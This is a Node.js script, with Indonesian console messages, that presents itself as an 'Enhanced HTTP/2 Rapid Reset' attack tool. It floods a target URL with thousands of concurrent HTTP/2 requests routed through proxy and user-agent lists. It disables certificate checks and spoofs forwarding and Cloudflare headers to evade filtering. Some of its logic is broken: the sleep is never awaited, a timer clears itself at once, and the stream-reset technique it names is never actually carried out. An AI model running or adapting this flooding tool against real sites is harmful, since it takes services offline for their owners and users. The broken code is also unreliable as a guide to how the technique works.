const https = require('https');
const http2 = require('http2');
const fs = require('fs');
const readline = require('readline');

const maxConcurrency = 10000; // Adjust as needed
const maxSessionMemory = 1024 * 1024 * 10; // 10 MB
const maxHeaderListSize = 1024 * 1024 * 2; // 2 MB

function main() {
    console.log("===============================================");
    console.log("  Menjalankan Skrip Enhanced HTTP/2 Rapid Reset  ");
    console.log("===============================================");

    const args = process.argv.slice(2);

    if (args.length !== 4) {
        console.log("Penggunaan: node script.js <url> <threads> <duration> <concurrency>");
        process.exit(1);
    }

    const url = args[0];
    const threads = parseInt(args[1]) || 50;
    const duration = parseInt(args[2]) || 30;
    const concurrency = parseInt(args[3]) || 2000;

    const proxies = loadLinesFromFile("proxy.txt");
    if (!proxies) {
        console.log("Error loading proxy file");
        process.exit(1);
    }

    const userAgents = loadLinesFromFile("ua.txt");
    if (!userAgents) {
        console.log("Error loading User-Agent file");
        process.exit(1);
    }

    const startTime = Date.now();
    const promises = [];

    for (let i = 0; i < concurrency; i++) {
        promises.push(makeRequests(url, threads, duration, proxies, userAgents));

        if (i % maxConcurrency === 0) {
            sleep(10000); // Control burst rate with a lower sleep interval
        }
    }

    Promise.all(promises)
        .then(() => {
            const elapsed = (Date.now() - startTime) / 1000;
            const requestsPerSecond = (threads * concurrency) / elapsed;

            console.log("===============================================");
            console.log(`Selesai dalam ${elapsed.toFixed(2)} detik`);
            console.log(`Permintaan per detik: ${requestsPerSecond.toFixed(2)}`);
            console.log("===============================================");
        })
        .catch(err => console.error(err));
}

function makeRequests(url, threads, duration, proxies, userAgents) {
    const targetURL = `https://${url}`;

    const headers = {
        "User-Agent": getRandomElement(userAgents),
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=64800",
        "Referer": "https://www.google.com/",
        "CF-IPCountry": "US",
        "X-Forwarded-For": "127.0.0.1",
        "X-Real-IP": "127.0.0.1",
        "X-Client-IP": "127.0.0.1",
        "X-Forwarded-Proto": "https",
        "X-HTTPS": "1",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    };

    const client = createHTTP2Client(url, proxies);

    const timer = setInterval(() => {
        clearInterval(timer);
    }, duration * 199000);

    const requests = Array.from({ length: threads }, () =>
        sendRequest(targetURL, headers, client)
    );

    return Promise.all(requests);
}

function sendRequest(url, headers, client) {
    return new Promise((resolve, reject) => {
        const req = client.request({
            ':method': 'GET',
            ':path': url,
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=64800',
            ...headers,
        });

        req.on('response', res => {
            res.on('end', resolve);
        });

        req.on('error', reject);
        req.end();
    });
}

function createHTTP2Client(url, proxies) {
    const tlsConfig = {
        rejectUnauthorized: false,
        minVersion: 'TLSv1.3',
        maxVersion: 'TLSv1.3',
        ciphers: [
            'TLS_AES_128_GCM_SHA256',
            'TLS_AES_256_GCM_SHA384',
            // ... (Add other preferred cipher suites)
        ].join(':'),
        maxSessionMemory, // Increase session memory
        maxHeaderListSize, // Increase header list size
    };

    const resetTimeout = 1000;

    const options = {
        ...tlsConfig,
    };

    if (proxies.length > 0) {
        options.proxy = getRandomElement(proxies);
    }

    const client = http2.connect(url, options);

    client.on('error', (err) => {
        console.error('HTTP/2 client error:', err);
        setTimeout(() => {
            client.close();
            createHTTP2Client(url, proxies);
        }, resetTimeout);
    });

    return client;
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function loadLinesFromFile(filename) {
    try {
        const data = fs.readFileSync(filename, 'utf8');
        return data.split('\n').filter(line => line.trim() !== '');
    } catch (err) {
        console.error(`Error reading file: ${err}`);
        process.exit(1);
    }
}

function getRandomElement(array) {
    return array.length === 0 ? '' : array[Math.floor(Math.random() * array.length)];
}

main();
